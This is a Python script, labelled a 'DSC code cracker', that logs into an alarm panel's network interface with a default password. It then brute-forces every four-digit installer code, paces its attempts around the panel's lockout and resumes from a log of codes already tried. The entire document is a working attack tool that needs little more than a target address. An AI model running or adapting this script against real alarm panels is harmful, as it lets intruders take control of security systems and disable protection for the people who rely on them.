#!/usr/bin/env python3
import socket
import sys
import time
import itertools
import os
import re

# YOUR SETTINGS
HOST = '192.168.1.3'
PORT = 4025
PASSWORD = 'user'  
PARTITION = '1'
MAX_ATTEMPTS = 2   
FAIL_FILE = 'fail.txt'  # Hardcoded failed codes log

def send_raw(sock, cmd, data=''):
    chksum_val = sum(ord(c) for c in (cmd + data)) & 0xFF
    chksum_hex = f'{chksum_val:02X}'  # Convert to 2-char hex string
    full_msg = (cmd + data + chksum_hex + '\r\n').encode('ascii')
    sock.send(full_msg)
    # Debug: show what we sent
    hex_msg = ' '.join(f'{b:02x}' for b in full_msg)
    print(f'  [sent: {hex_msg}]', end='', flush=True)

def recv_simple(sock, timeout=1.5):
    sock.settimeout(timeout)
    try:
        data = sock.recv(64)
        return ''.join(chr(b) for b in data if 32 <= b <= 126)
    except socket.timeout:
        return ''  # Timeout is expected
    except Exception as e:
        print(f'\n⚠️ recv_simple error: {e}')
        raise

def recv_with_timeout(sock, target=None, timeout=2.0):
    """Receive data and optionally wait for a specific pattern."""
    sock.settimeout(0.2)
    start = time.time()
    responses = []
    raw_data = []
    
    while time.time() - start < timeout:
        try:
            data = sock.recv(64)
            if data:
                raw_data.append(data)
                response = ''.join(chr(b) for b in data if 32 <= b <= 126)
                responses.append(response)
                # If we have a target pattern and found it, return immediately
                if target and re.search(target, response):
                    return response
        except socket.timeout:
            pass  # Timeout is expected in non-blocking mode
        except Exception as e:
            print(f'\n⚠️ recv_with_timeout error: {e}')
            break
    
    # Return concatenated responses or empty string
    result = ''.join(responses) if responses else ''
    if not result and raw_data:
        # Log raw bytes if we got data but it didn't parse as printable ASCII
        hex_data = ' '.join(f'{b:02x}' for chunk in raw_data for b in chunk)
        print(f'  [raw: {hex_data}]')
    return result

def load_failed_codes():
    """Load previously failed codes from file."""
    if os.path.exists(FAIL_FILE):
        print(f'Loading {FAIL_FILE}...')
        with open(FAIL_FILE, 'r') as f:
            failed = set(line.strip() for line in f if line.strip())
        print(f'Loaded {len(failed)} previously failed codes')
        return failed
    return set()

def verify_file_writable():
    """Check that we can write to the fail file."""
    try:
        with open(FAIL_FILE, 'a') as f:
            pass
        return True
    except Exception as e:
        print(f'❌ Cannot write to {FAIL_FILE}: {e}')
        return False

def save_failed_code(code):
    """Append failed code to file."""
    with open(FAIL_FILE, 'a') as f:
        f.write(code + '\n')
    print(f'Logged {code} to {FAIL_FILE}')

def test_code(sock, code, test_num):
    print(f'[{test_num:4d}] {code} ', end='', flush=True)
    
    # Send keys: partition 1, *8 to enter installer mode
    send_raw(sock, '071', f'{PARTITION}*8')
    time.sleep(1.0)  # Increased delay
    
    # Wait for 922 response (system requests installer code)
    resp = recv_with_timeout(sock, target='922', timeout=3.0)  # Increased timeout
    if not resp or '922' not in resp:
        # Failed to enter installer mode - this is a system issue, not a code test
        print(f'? (no 922, got: "{resp}")')
        raise Exception(f'Failed to enter installer mode - no 922 response (got: "{resp}")')
    
    # Send the code using command 200
    send_raw(sock, '200', code)
    time.sleep(0.5)
    
    # Check response: 680 = success (installer mode), 670/922 = code is wrong
    resp = recv_with_timeout(sock, target='6[5678]|922', timeout=2.0)
    
    if resp and '680' in resp:
        print('✓ FOUND!')
        # Back out gracefully
        send_raw(sock, '071', f'{PARTITION}##')
        time.sleep(0.6)
        # Drain any backout response
        recv_with_timeout(sock, timeout=1.0)
        return True
    else:
        # Code was wrong - this is a valid test result
        # Back out to main menu
        send_raw(sock, '071', f'{PARTITION}##')
        time.sleep(0.6)
        # Drain any backout response
        recv_with_timeout(sock, timeout=1.0)
        print('✗')
        return False

def connect_fresh():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((HOST, PORT))
    
    try:
        sock.recv(64)
    except socket.timeout:
        pass  # Expected if no data waiting
    except Exception as e:
        print(f'⚠️ Initial recv warning: {e}')
    
    send_raw(sock, '005', PASSWORD)
    time.sleep(1.5)
    resp = recv_simple(sock)
    if '505' not in resp:
        raise Exception('Login failed')
    
    print('Connected ✓')
    return sock

def main():
    print('🔥 DSC CODE CRACKER - RESUMABLE')
    print(f'Fail log: {FAIL_FILE}')
    print('LISTEN FOR KEYPAD ARM TONE!\n')
    
    # Verify we can write to fail file before starting
    if not verify_file_writable():
        return
    
    # Load previous failures
    failed_codes = load_failed_codes()
    
    test_num = -1  # Start at -1 so first increment makes it 0
    fails = 0
    sock = None
    retry_count = 0
    max_retries = 3
    
    while test_num <= 9999:
        try:
            test_num += 1
            code = f'{test_num:04d}'
            
            # Skip if already tried
            if code in failed_codes:
                print(f'[{test_num:4d}] {code} SKIPPED (known fail)')
                continue
            
            # Create connection if needed
            if sock is None:
                sock = connect_fresh()
            
            if test_code(sock, code, test_num):
                print(f'\n🎉🎉 MASTER CODE: {code} 🎉🎉')
                print('STOP script! Verify on keypad!')
                if sock:
                    sock.close()
                return
            
            # Reset retry counter on successful test
            retry_count = 0
            
            # Log failure
            save_failed_code(code)
            failed_codes.add(code)
            
            fails += 1
            if fails >= MAX_ATTEMPTS:
                print('🔒 LOCKOUT - 90s wait')
                time.sleep(90)
                fails = 0
            
            time.sleep(3)
            
        except KeyboardInterrupt:
            print(f'\n🛑 STOPPED')
            print(f'Tried {test_num} codes, {len(failed_codes)} logged in {FAIL_FILE}')
            if sock:
                sock.close()
            break
        except Exception as e:
            print(f'ERROR: {e}')
            # On connection error, reconnect and retry same code (don't log as failed)
            if 'sock' in locals():
                try:
                    sock.close()
                except:
                    pass
            sock = connect_fresh()
            retry_count += 1
            
            # If we've retried this code too many times, give up and log it as failed
            if retry_count >= max_retries:
                print(f'⚠️ Giving up on code {code} after {max_retries} retries')
                save_failed_code(code)
                failed_codes.add(code)
                retry_count = 0
            else:
                test_num -= 1  # Retry this code by decrementing
            
            time.sleep(5)
            continue
    
    # Loop completed without finding code
    print(f'\n❌ Exhausted all 10000 codes without finding master code')
    print(f'Tried {test_num} codes, {len(failed_codes)} logged in {FAIL_FILE}')
    if sock:
        sock.close()

if __name__ == '__main__':
    main()